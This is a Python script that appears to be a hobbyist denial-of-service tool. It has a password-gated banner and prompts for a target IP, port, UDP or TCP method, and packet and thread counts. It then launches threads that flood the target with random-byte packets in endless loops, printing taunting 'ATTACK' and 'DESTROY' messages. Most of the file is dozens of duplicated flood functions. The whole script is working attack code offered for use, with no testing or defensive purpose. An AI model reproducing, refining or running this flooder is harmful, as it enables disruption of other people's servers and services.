import random
import socket
import threading
import os
import sys
import time

os.system("clear")
print("\033[1;31;40m")
print("""   ___                       _   _ _ ____       _    
  / _ \ _ __ ___   __ _ _ __| \ | (_)  _ \  ___| | __
 | | | | '_ ` _ \ / _` | '__|  \| | | | | |/ _ \ |/ /
 | |_| | | | | | | (_| | |  | |\  | | |_| |  __/   < 
  \___/|_| |_| |_|\__,_|_|  |_| \_|_|____/ \___|_|\_\
                                                     """)
#login tools
password ="OmarCupu"
for i in range(3):
	pwd = input("\u001b[37m[+] Enter Password  : ")
	j=3
	if(pwd==password):
		time.sleep(2)
		print("[!] Please Security To Password!!! ")
		break
	else:
		time.sleep(2)
		print("\u001b[31m[×] Wrong IS Security Password!!! ")
		continue
time.sleep(2)
print("\u001b[35m{√} Successfully Loginned")
time.sleep(3)

os.system("clear")
print(" \033[95m Tools By : Omar")
print(" \033[95m Jan Abuse Tools Gw Ya kids")
print("\033[1;36;40m--------METHODS UDP / TCP TOOLS------")
print("\033[0m")
print(""" \033[96m
 ░░░░░░░░░░▀▀▀██████▄▄▄░░░░░░░░░░
░░░░░░░░░░░░░░░░░▀▀▀████▄░░░░░░░
░░░░░░░░░░▄███████▀░░░▀███▄░░░░░
░░░░░░░░▄███████▀░░░░░░░▀███▄░░░
░░░░░░▄████████░░░░░░░░░░░███▄░░
░░░░░██████████▄░░░░░░░░░░░███▌░
░░░░░▀█████▀░▀███▄░░░░░░░░░▐███░
░░░░░░░▀█▀░░░░░▀███▄░░░░░░░▐███░
░░░░░░░░░░░░░░░░░▀███▄░░░░░███▌░
░░░░▄██▄░░░░░░░░░░░▀███▄░░▐███░░
░░▄██████▄░░░░░░░░░░░▀███▄███░░░
░█████▀▀████▄▄░░░░░░░░▄█████░░░░
░████▀░░░▀▀█████▄▄▄▄█████████▄░░
░░▀▀░░░░░░░░░▀▀██████▀▀░░░▀▀██░░ """)
print("\033[0m")
ip = str(input("\033[91m Host/Ip Target:"))
port = int(input("\033[0m\033[91m Port Target:"))
choice = str(input("\033[0m\033[91m Method | UDP / TCP |:"))
times = int(input("\033[0m\033[91m Paket :"))
threads = int(input("\033[0m\033[91m Threads:"))

os.system("clear")
def run():
	data = random._urandom(666)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			print("\033[92m DOWN AJG AWOKWOK!!!")

def run2():
	data = random._urandom(1818)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")

def run3():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run4():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run5():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run6():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run7():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run8():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run9():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run10():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run11():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run12():
	data = random._urandom(666)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			print("\033[92m DOWN AJG AWOKWOK!!!")

def run13():
	data = random._urandom(1818)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")

def run14():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run15():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run16():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run17():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run18():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run19():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run20():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run21():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run22():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run23():
	data = random._urandom(666)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			print("\033[92m DOWN AJG AWOKWOK!!!")

def run24():
	data = random._urandom(1818)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")

def run25():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run26():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run27():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run28():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run29():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run30():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run31():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run32():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run33():
	data = random._urandom(666)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			print("\033[92m DOWN AJG AWOKWOK!!!")

def run34():
	data = random._urandom(1818)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")

def run35():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run36():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run37():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run38():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run39():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run40():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run41():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run42():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run43():
	data = random._urandom(666)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			print("\033[92m DOWN AJG AWOKWOK!!!")

def run44():
	data = random._urandom(1818)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")

def run45():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run46():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run47():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run48():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run49():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run50():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run51():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")
			
def run52():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m OMAR? ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN AJG AWOKWOK!!!")


for udp in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()   
 
for y in range(threads):
  if choice == 'TCP':
    th = threading.Thread(target = run3)
    th.start() 
   
